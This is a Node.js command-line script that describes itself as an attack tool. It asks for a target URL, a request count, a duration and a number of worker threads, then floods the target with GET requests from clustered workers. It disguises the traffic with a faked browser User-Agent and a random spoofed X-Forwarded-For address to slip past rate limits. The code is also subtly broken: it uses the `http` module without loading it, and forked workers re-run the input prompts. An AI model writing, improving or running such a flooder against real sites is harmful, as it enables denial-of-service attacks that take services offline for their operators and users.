const https = require('https');
const url = require('url');
const cluster = require('cluster');

// Function to send concurrent requests
function sendRequests(targetUrl, numRequests, duration) {
  const parsedUrl = url.parse(targetUrl);
  const isHttps = parsedUrl.protocol === 'https:';

  const startTime = Date.now();
  const endTime = startTime + duration * 1000; // Convert duration to milliseconds

  for (let i = 0; i < numRequests; i++) {
    const options = {
      hostname: parsedUrl.hostname,
      path: parsedUrl.path,
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'X-Forwarded-For': generateIP() // Generate a random IP address
      }
    };

    const request = (isHttps ? https : http).get(options);
    request.on('error', (err) => {
      console.error(`Error: ${err.message}`);
    });
  }

  // Recursively send requests until the specified duration is reached
  if (Date.now() < endTime) {
    setTimeout(() => sendRequests(targetUrl, numRequests, duration), 1000);
  }
}

// Function to generate a random IP address
function generateIP() {
  const octets = [];
  for (let i = 0; i < 4; i++) {
    octets.push(Math.floor(Math.random() * 256));
  }
  return octets.join('.');
}

// Function to start the attack with multi-threading
function startAttack(targetUrl, numRequests, duration, numWorkers) {
  if (cluster.isMaster) {
    for (let i = 0; i < numWorkers; i++) {
      cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
      console.log(`Worker ${worker.process.pid} died`);
    });
  } else {
    sendRequests(targetUrl, numRequests, duration);
  }
}

// Prompt the user for input
const readline = require('readline').createInterface({
  input: process.stdin,
  output: process.stdout
});

readline.question('Enter the target URL: ', (targetUrl) => {
  readline.question('Enter the number of concurrent requests: ', (numRequests) => {
    readline.question('Enter the duration of the attack in seconds: ', (duration) => {
      readline.question('Enter the number of worker threads: ', (numWorkers) => {
        numRequests = parseInt(numRequests);
        duration = parseInt(duration);
        numWorkers = parseInt(numWorkers);

        // Start the attack
        startAttack(targetUrl, numRequests, duration, numWorkers);

        readline.close();
      });
    });
  });
});